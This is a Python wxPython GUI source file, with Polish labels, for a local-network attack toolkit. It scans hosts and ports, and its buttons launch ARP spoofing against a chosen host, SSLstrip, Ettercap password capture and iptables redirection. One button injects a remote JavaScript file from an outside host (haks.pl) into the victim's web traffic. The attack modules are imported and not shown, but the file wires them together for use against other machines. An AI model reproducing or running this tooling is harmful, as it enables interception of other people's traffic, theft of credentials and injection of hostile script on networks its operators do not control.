#!/usr/bin/python
# -*- coding: utf-8 -*-
import wx,os,time,random
import wx.lib.mixins.listctrl
from Host import *
from SqlHandler import *
from Scanner import *
from SystemLinux import *
from multiprocessing import Process
from ArpSpoof import *
from GuiAddHost import *
from JSInjection import *
from SslStrip import *
import thread
from Sniffer import runSniffer

class Gui(wx.Frame):

    def initRequiedVariables(self):
        self.attacked=False
        '''self.JsInjectAtacked=False'''
        self.systemLinux = SystemLinux(self)
        #inicjalizacja, że nie jest zaznaczony żaden host
        self.selected = 0
        self.sc = Scanner()
        self.sqlHandler = SqlHandler()
        self.hosts = []
        
    def __init__(self, parent, title):
        appWidth = 985
        appHeight = 580
        super(Gui, self).__init__(parent, title=title, size=(appWidth, appHeight))
        
        ##ikona
        icon = wx.EmptyIcon()
        icon.CopyFromBitmap(wx.Bitmap("network.ico", wx.BITMAP_TYPE_ANY))
        self.SetIcon(icon)

        self.initRequiedVariables();


        tableWidth = 695
        tableHeight = 450
        #tworzenie panelu dla tabeli
        sizer = wx.BoxSizer(wx.VERTICAL)
        panel = wx.Panel(self, -1, size=(tableWidth,tableHeight), pos=(5,0), style=wx.BORDER_RAISED)
        sizer.Add(panel)
        
        
        #tworzenie nagłówków tabeli
        self.hostsList = wx.ListCtrl(panel, size=(tableWidth,tableHeight),style=wx.LC_REPORT|wx.BORDER_SUNKEN)
        self.hostsList.InsertColumn(0, 'ID', width=30)
        self.hostsList.InsertColumn(1, 'IP', width=90)
        self.hostsList.InsertColumn(2, 'MAC', width=130)
        self.hostsList.InsertColumn(3, 'Nazwa', width=100)
        self.hostsList.InsertColumn(4, 'NetBIOS', width=100)
        self.hostsList.InsertColumn(5, 'Opis', width=100)
        self.hostsList.InsertColumn(6, 'Otwarte porty', width=90)
        self.hostsList.InsertColumn(7, 'Online', width=50)
        #akcja po kliknięciu na hosta
        self.Bind(wx.EVT_LIST_ITEM_SELECTED, self.onSelectedHost, self.hostsList)
        
        padding = 10
        bottonLeftPos1 = 705
        buttonWidth = 130
        bottonLeftPos2 = bottonLeftPos1 + padding + buttonWidth
        #                0 1  2  3  4   5   6   7   8   9   10  11  12  13                                     
        buttonTopPos1 = [0,30,60,90,120,150,180,220,250,280,310,350,380,410]
        buttonTopPos2 = [0,30,60,90,120,150,190,220,250,280,310,340,370,400]
        #Dodanie przycisków i separujących lini
        self.button_scan = wx.Button           (self, 1,  'Skanuj sieć',(bottonLeftPos1,                buttonTopPos1[0]),(buttonWidth, -1))
        self.button_hostFromDB = wx.Button     (self, 2,  'Wczytaj z bazy',(bottonLeftPos1,             buttonTopPos1[1]),(buttonWidth, -1))
        self.button_addHostManually = wx.Button(self, 3,  'Dodaj ręcznie',(bottonLeftPos1,              buttonTopPos1[2]),(buttonWidth, -1))
        self.button_clearList = wx.Button      (self, 12, 'Wyczyść listę',(bottonLeftPos1,              buttonTopPos1[3]),(buttonWidth, -1))
        self.button_removeHost = wx.Button     (self, 18, 'Usuń',(bottonLeftPos1,                       buttonTopPos1[4]),(buttonWidth, -1))
        self.button_addHostDesc = wx.Button    (self, 9,  'Edytuj',(bottonLeftPos1,                     buttonTopPos1[5]),(buttonWidth, -1))
        self.button_addHostToDB = wx.Button    (self, 4,  'Zapisz',(bottonLeftPos1,                     buttonTopPos1[6]),(buttonWidth, -1))
        
        self.button_portScan = wx.Button       (self, 5,  'Host porty',(bottonLeftPos1,                 buttonTopPos1[7]),(buttonWidth, -1))
        self.button_startWireshark = wx.Button (self, 7,  'Host Wireshark',(bottonLeftPos1,             buttonTopPos1[8]),(buttonWidth, -1))
        self.button_checkOnline = wx.Button    (self, 8,  'Host online',(bottonLeftPos1,                buttonTopPos1[9]),(buttonWidth, -1))
        self.button_getNetbios = wx.Button     (self, 21,'HOST NetBIOS',(bottonLeftPos1,               buttonTopPos1[10]),(buttonWidth, -1))
        
        self.button_portScanAll = wx.Button    (self, 19,'Wszystkie porty',(bottonLeftPos1,            buttonTopPos1[11]),(buttonWidth, -1))
        self.button_checkOnlineAll = wx.Button (self, 20,'Wszystkie online',(bottonLeftPos1,           buttonTopPos1[12]),(buttonWidth, -1))
        self.button_netbiosScanAll = wx.Button (self, 22,'Wszystkie NetBIOS',(bottonLeftPos1,          buttonTopPos1[13]),(buttonWidth, -1))
        
        self.button_clearIptables = wx.Button  (self, 13, 'Wyczyść Iptables',(bottonLeftPos2,           buttonTopPos2[0]),(buttonWidth, -1))
        self.button_kernelForwarding = wx.Button(self, 14, 'Kernel forwarding',(bottonLeftPos2,         buttonTopPos2[1]),(buttonWidth, -1))
        self.button_forwardPortToPort = wx.Button(self, 15, 'Forward port port',(bottonLeftPos2,         buttonTopPos2[2]),(buttonWidth, -1))
        self.button_forwardPortToIp = wx.Button(self, 16, 'Forward port IP',(bottonLeftPos2,           buttonTopPos2[3]),(buttonWidth, -1))
        self.button_startEttercap = wx.Button  (self, 17, 'Ettercap pass',(bottonLeftPos2,             buttonTopPos2[4]),(buttonWidth, -1))
        self.button_checkSafety = wx.Button    (self, 10,  'Bezpieczeństwo',(bottonLeftPos2,            buttonTopPos2[5]),(buttonWidth, -1))
              
        self.button_arpSpoof = wx.Button       (self, 6,  'ARP spoofing start',(bottonLeftPos2,         buttonTopPos2[6]),(buttonWidth, -1))
        self.button_stopArp = wx.Button        (self, 11, 'ARP spoofing stop',(bottonLeftPos2,          buttonTopPos2[7]),(buttonWidth, -1))       
        self.button_jsInjectionStart = wx.Button(self, 23, 'JS Injection start',(bottonLeftPos2,        buttonTopPos2[8]),(buttonWidth, -1))
#        self.button_jsInjectionStop = wx.Button(self, 24, 'JS Injection stop',(bottonLeftPos2,         buttonTopPos2[9]),(buttonWidth, -1))
        self.button_sslStripStart = wx.Button  (self, 25, 'SSLstrip start',(bottonLeftPos2,            buttonTopPos2[10]),(buttonWidth, -1))
#        self.button_test3 = wx.Button         (self, 999, 'SSLstrip stop',(bottonLeftPos2,             buttonTopPos2[11]),(buttonWidth, -1))

        

        #wtbór eth0
        #start apahe2 with js script
        '''self.button_jsInject = wx.Button(self, 12, 'Wykonaj JS Injection',(605, 320),(200, -1))
        self.button_jsInjectStop = wx.Button(self, 13, 'Zatrzymaj JS Injection',(605, 350),(200, -1))
        self.button_checkSafety = wx.Button(self, 10, 'Sprawdź swoje bezpieczeństwo',(605, 380),(200, -1))'''
        #self.staticLine2 = wx.StaticLine(self, pos=(bottonLeftPos1, 315), size=(buttonWidth,1))
        '''self.button_jsInject.Bind(wx.EVT_BUTTON, self.buttonJsInjectStart,id=12)
        self.button_jsInjectStop.Bind(wx.EVT_BUTTON, self.buttonJsInjectStop,id=13)'''  
        '''self.jsInjectDesc = wx.StaticText(self, label='Nie wykonujesz JS injection', pos=(610, 470))
        self.jsInjectDesc.SetForegroundColour(wx.Colour(51,153,51))
        self.jsInjectDesc.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))'''
        '''def buttonJsInjectStart(self,event):
            if self.selected != 0:
                try:
                    self.p2.terminate()
                except:
                    pass
                self.attackDesc.SetLabel('Atakujesz JSI hosta nr: '+str(self.selected))
                hostIP = self.hosts[self.selected-1].ip
                routerIP = self.routerIPtext.GetValue()
                self.p2 = Process(target=jsInjectThread, args=(hostIP,routerIP))
                self.p2.start()
                self.JsInjectAtacked = True
                
        def buttonJsInjectStop(self,event):
            try:
                self.JsInjectAtacked = False
                self.jsInjectDesc.SetLabel('Nie wykonujesz ataku JS injection')
                self.jsInjectDesc.SetForegroundColour(wx.Colour(51,153,51))
                self.jsInjectDesc.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
                self.p2.terminate()
            except:
                pass'''      
        #bindowanie funkcji dla przycisków
        self.button_scan.Bind(wx.EVT_BUTTON, self.buttonScan,id=1) 
        self.button_portScan.Bind(wx.EVT_BUTTON, self.buttonPortScan,id=5) 
        self.button_arpSpoof.Bind(wx.EVT_BUTTON, self.buttonArpSpoof,id=6) 
        self.button_startWireshark.Bind(wx.EVT_BUTTON, self.buttonStartWireshark,id=7)
        self.button_stopArp.Bind(wx.EVT_BUTTON, self.buttonStopArp,id=11)
        self.button_addHostDesc.Bind(wx.EVT_BUTTON, self.buttonAddDesc,id=9)
        self.button_checkOnline.Bind(wx.EVT_BUTTON, self.buttonCheckOnline,id=8)
        self.button_addHostToDB.Bind(wx.EVT_BUTTON, self.buttonAddHostToDb,id=4)
        self.button_hostFromDB.Bind(wx.EVT_BUTTON, self.buttonHostFromDb,id=2)
        self.button_addHostManually.Bind(wx.EVT_BUTTON, self.buttonAddManually,id=3)
        self.button_checkSafety.Bind(wx.EVT_BUTTON, self.buttonCheckSafety,id=10)
        self.button_clearList.Bind(wx.EVT_BUTTON, self.buttonClearList,id=12)
        self.button_clearIptables.Bind(wx.EVT_BUTTON, self.buttonClearIptables,id=13)
        self.button_kernelForwarding.Bind(wx.EVT_BUTTON, self.buttonKernelForwarding,id=14)
        self.button_forwardPortToPort.Bind(wx.EVT_BUTTON, self.buttonForwardPortToPort,id=15)
        self.button_forwardPortToIp.Bind(wx.EVT_BUTTON, self.buttonForwardPortToIp,id=16)
        self.button_startEttercap.Bind(wx.EVT_BUTTON, self.buttonStartEttercap,id=17)
        self.button_removeHost.Bind(wx.EVT_BUTTON, self.buttonRemoveHost,id=18)
        self.button_portScanAll.Bind(wx.EVT_BUTTON, self.buttonPortScanAll,id=19)
        self.button_checkOnlineAll.Bind(wx.EVT_BUTTON, self.buttonCheckOnlineAll,id=20)
        self.button_getNetbios.Bind(wx.EVT_BUTTON, self.buttonGetNetbios,id=21)
        self.button_netbiosScanAll.Bind(wx.EVT_BUTTON, self.buttonNetbiosScanAll,id=22)
        self.button_jsInjectionStart.Bind(wx.EVT_BUTTON, self.buttonJsInjectionStart,id=23)
#        self.button_jsInjectionStop.Bind(wx.EVT_BUTTON, self.buttonJsInjectionStop,id=24)
        #dodanie napisów oraz pól dla IP MAC oraz maski
        self.button_sslStripStart.Bind(wx.EVT_BUTTON, self.buttonSslStripStart,id=25)

        
        settingsLabelTop = 557
        settingsTop = settingsLabelTop -5
        settingsLeft = [95,145,260,325,450,510,625,700,820,865]
        
        self.labelSelectedHost = wx.StaticText(self, label='Wybrany: _', pos=(5, settingsLabelTop))
        self.labelSelectedHost.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
        self.labelSelectedHost.SetForegroundColour(wx.Colour(251,20,20))
        self.staticLine3 = wx.StaticLine(self, -1, pos=(90,             settingsLabelTop-10), size=(1,appHeight), style=wx.LI_VERTICAL)
        self.myIP = wx.StaticText(self, label='Twój IP: ', pos=(        settingsLeft[0],  settingsLabelTop))
        self.myIPtext = wx.TextCtrl(self,value="my ip", pos=(           settingsLeft[1],  settingsTop),size = (105,25))
        self.myMAC = wx.StaticText(self, label='Twój MAC: ', pos=(      settingsLeft[2], settingsLabelTop))
        self.myMACtext = wx.TextCtrl(self,value="my mac", pos=(         settingsLeft[3], settingsTop),size = (115,25))
        self.routerIP = wx.StaticText(self, label='Router IP: ', pos=(  settingsLeft[4], settingsLabelTop))
        self.routerIPtext = wx.TextCtrl(self,value="router ip", pos=(   settingsLeft[5], settingsTop),size = (105,25))
        self.routerMAC = wx.StaticText(self, label='Router MAC: ', pos=(settingsLeft[6], settingsLabelTop))
        self.routerMACtext = wx.TextCtrl(self,value="router mac", pos=( settingsLeft[7], settingsTop),size = (110,25))
        self.netMask = wx.StaticText(self, label='Maska: ', pos=(       settingsLeft[8], settingsLabelTop))
        self.netMasktext = wx.TextCtrl(self,value="netmask", pos=(      settingsLeft[9], settingsTop),size = (115,25))
        self.staticLine2 = wx.StaticLine(self, pos=(0,                  settingsLabelTop-10), size=(appWidth,1))
        
        
        
        
        
        self.infoDesc = wx.StaticText(self, label='Aktualne informacje', pos=(10, 460))
        self.infoDesc.SetForegroundColour(wx.Colour(151,53,151))
        self.infoDesc.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
        
        
        self.attackDesc = wx.StaticText(self, label='Nie wykonujesz ataku Arp', pos=(10, 490))
        self.attackDesc.SetForegroundColour(wx.Colour(51,153,51))
        self.attackDesc.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
        self.safetyResult = wx.StaticText(self, label='Bezpieczeństwo nieznane', pos=(10, 520))
        self.safetyResult.SetForegroundColour(wx.Colour(51,50,250))
        self.safetyResult.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
        
        
        
        
        #zmienia kolory napisu jak jest atakowany host
        self.timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.updateAttackInfo, self.timer)
        self.timer.Start(1000)
        
        #wyświetlenie ramki
        self.Show()
        
        #pobranie i wstawienie adresów
        self.systemLinux.getMyIP()
        self.systemLinux.getMyMac()
        self.systemLinux.getNetmask()
        self.systemLinux.getRouterIP()
        self.systemLinux.getRouterMac()

        #akcja wykonywana po zamknięciu okna
        self.Bind(wx.EVT_CLOSE, self.killAllThreads)
        
    def setInfo(self,info):
        self.infoDesc.SetLabel(info)
        
    def buttonForwardPortToPort(self,event):
        self.setInfo(self.systemLinux.forwardPortToPort("80","81"))
          
    def buttonForwardPortToIp(self,event):
        self.setInfo(self.systemLinux.forwardPortToIP("80","212.77.98.9:80"))  

    def buttonStartEttercap(self,event):
        self.systemLinux.startEttercap()
        self.setInfo("Ettercap uruchomiony")
          
    def buttonKernelForwarding(self,event):  
        self.setInfo(self.systemLinux.setKernelForwarding())
        
    def buttonClearIptables(self,event):
        self.setInfo(self.systemLinux.clearIptables())
    
    def buttonCheckSafety(self,event):
        thread.start_new_thread( runSniffer, (self.myIPtext.GetValue(),self,))
        
    def buttonAddManually(self,event):
        self.child = GuiAddHost(self,True)
        self.child.Show()
        
    def buttonHostFromDb(self,event):
        dbHosts = self.sqlHandler.getAllHosts()
        mergeCurrentHostAndDbHosts(self.hosts, dbHosts)
        self.fillHostList()   
        
    def updateAttackInfo(self, event):
        if self.attacked == True:
            colors = [wx.Colour(184,0,0),wx.Colour(245,0,0),wx.Colour(245,0,122),wx.Colour(255,117,71)]
            self.attackDesc.SetForegroundColour(random.choice(colors))
        '''if self.JsInjectAtacked == True:
            colors = [wx.Colour(184,0,0),wx.Colour(245,0,0),wx.Colour(245,0,122),wx.Colour(255,117,71)]
            self.attackDesc.SetForegroundColour(random.choice(colors))'''
    
    def buttonCheckOnline(self,event):
        if self.selected != 0:
            isAlive = self.sc.getIsAlive(self.hosts[self.selected-1].ip)
            self.hosts[self.selected-1].setIsAlive(isAlive)
            self.fillHostList()
            
    def buttonGetNetbios(self,event):
        if self.selected != 0:
            netbios = self.sc.getNetbiosName(self.hosts[self.selected-1].ip)
            self.hosts[self.selected-1].setNetbios(netbios)
            self.fillHostList()
         
    def buttonAddHostToDb(self,event):
        #if len(self.hosts) > 0:
        self.sqlHandler.updateHosts(self.hosts)
                
    def buttonAddDesc(self,event):
        if self.selected != 0:
            self.child = GuiAddHost(self,False)
            self.child.Show()
#             dlg = wx.TextEntryDialog(None, "Podaj opis hosta", defaultValue="")
#             dlg.ShowModal()
#             result = dlg.GetValue()
#             dlg.Destroy()
#             self.hosts[self.selected-1].setDescription(result)
#             self.fillHostList()
        
    def onSelectedHost(self,event):
        self.labelSelectedHost.SetLabel('Wybrany: '+event.GetText())
        self.selected = int(event.GetText())
        
    def setMyIpAddress(self,value):
        self.myIPtext.SetValue(value)
        
    def setMyMask(self,value):
        self.netMasktext.SetValue(value)
        
    def setMyMac(self,value):
        self.myMACtext.SetValue(value)
        
    def setRouterIpAddress(self,value):
        self.routerIPtext.SetValue(value)
        
    def setRouterMacAddress(self,value):
        self.routerMACtext.SetValue(value)
     
    def buttonNetbiosScanAll(self,event):
        if len(self.hosts) > 0:
            for i in range(len(self.hosts)):       
                netbios = self.sc.getNetbiosName(self.hosts[i].ip)
                self.hosts[i].setNetbios(netbios)
            self.fillHostList()
     
    def buttonPortScanAll(self,event):
        if len(self.hosts) > 0:
            for i in range(len(self.hosts)):
                ports = self.sc.getHostOpenPorts(self.hosts[i].ip, self.netMasktext.GetValue())
                self.hosts[i].setOpenPorts(ports)
            self.fillHostList() 
        
    def buttonCheckOnlineAll(self,event):
        if len(self.hosts) > 0:
            for i in range(len(self.hosts)):       
                isAlive = self.sc.getIsAlive(self.hosts[i].ip)
                self.hosts[i].setIsAlive(isAlive)
            self.fillHostList()   
                
    def buttonPortScan(self,event):
        if self.selected != 0:
            ports = self.sc.getHostOpenPorts(self.hosts[self.selected-1].ip, self.netMasktext.GetValue())
            self.hosts[self.selected-1].setOpenPorts(ports)
            self.fillHostList()
            
    def buttonStartWireshark(self,event):
        if self.selected != 0:
            hostIP = self.hosts[self.selected-1].ip
            os.system('wireshark -Y "ip.src == '+hostIP+' or ip.dst == '+hostIP+'" &')
    
    def buttonRemoveHost(self,event):
        if self.selected != 0:
            del self.hosts[self.selected-1]
        self.fillHostList()
            
    def buttonJsInjectionStart(self,event):
        if self.selected != 0:  
            try:
                self.p.terminate()
            except:
                pass
            #self.attackDesc.SetLabel('Atakujesz JS Injection hosta nr: '+str(self.selected))
            hostIP = self.hosts[self.selected-1].ip
            routerIP = self.routerIPtext.GetValue()
            self.jsAttack = Process(target=jsAttackThread, args=(hostIP,routerIP,"http://haks.pl/pliki/net.js"))
            self.jsAttack.start()
            #self.attacked = True

#     def buttonJsInjectionStop(self,event):
#         try:
#             self.attacked = False
#             self.attackDesc.SetLabel('Nie wykonujesz ataku JS Injection')
#             self.attackDesc.SetForegroundColour(wx.Colour(51,153,51))
#             self.attackDesc.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
#             self.jsAttack.terminate()
#         except:
#             pass
        
    def buttonSslStripStart(self,event):
        if self.selected != 0:  
#             try:
#                 self.p.terminate()
#             except:
#                 pass
            #self.attackDesc.SetLabel('Atakujesz JS Injection hosta nr: '+str(self.selected))
            self.systemLinux.forwardPortToPort("80","1234") 
            self.sslStrip = Process(target=sslStripThread, args=())
            self.sslStrip.start()
            #self.attacked = True
          
    def buttonArpSpoof(self,event):
        if self.selected != 0:
            try:
                self.p.terminate()
            except:
                pass
            self.attackDesc.SetLabel('Atakujesz ARP hosta nr: '+str(self.selected))
            hostIP = self.hosts[self.selected-1].ip
            routerIP = self.routerIPtext.GetValue()
            myMac = self.myMACtext.GetValue()
            self.p = Process(target=arpSpoofThread, args=(hostIP,routerIP,myMac))
            self.p.start()
            self.attacked = True
            
    def buttonStopArp(self,event):
        try:
            self.attacked = False
            self.attackDesc.SetLabel('Nie wykonujesz ataku Arp')
            self.attackDesc.SetForegroundColour(wx.Colour(51,153,51))
            self.attackDesc.SetFont(wx.Font(10, wx.DECORATIVE, wx.BOLD, wx.NORMAL))
            self.p.terminate()
        except:
            pass
         
    def killAllThreads(self,event):
        try:
            self.p.terminate()
            self.p2.terminate()
        except:
            pass
        self.Destroy()
    
    def buttonScan(self,event):
        myIP = self.myIPtext.GetValue()
        bitMask = getNetmaskBits(self.netMasktext.GetValue())
        myMac = self.myMACtext.GetValue().upper()
        self.hosts = self.sc.getNetworkHosts(myIP, bitMask, myMac)
        self.fillHostList()
        for host in self.hosts:
            if host.ip == self.routerIPtext.GetValue():
                self.setRouterMacAddress(host.mac)
                break;
            
    def fillHostList(self):     
        self.index = 0
        self.hostsList.DeleteAllItems()
        for host in self.hosts:
            self.hostsList.InsertStringItem(self.index, str(self.index+1))
            self.hostsList.SetStringItem(self.index, 1, host.ip)
            self.hostsList.SetStringItem(self.index, 2, host.mac)
            self.hostsList.SetStringItem(self.index, 3, host.name)
            self.hostsList.SetStringItem(self.index, 4, host.netbios)
            self.hostsList.SetStringItem(self.index, 5, host.desc)
            self.hostsList.SetStringItem(self.index, 6, host.ports)
            self.hostsList.SetStringItem(self.index, 7, host.live)
            self.index += 1

    def buttonClearList(self,event):
        self.hosts = []
        self.hostsList.DeleteAllItems()  
    
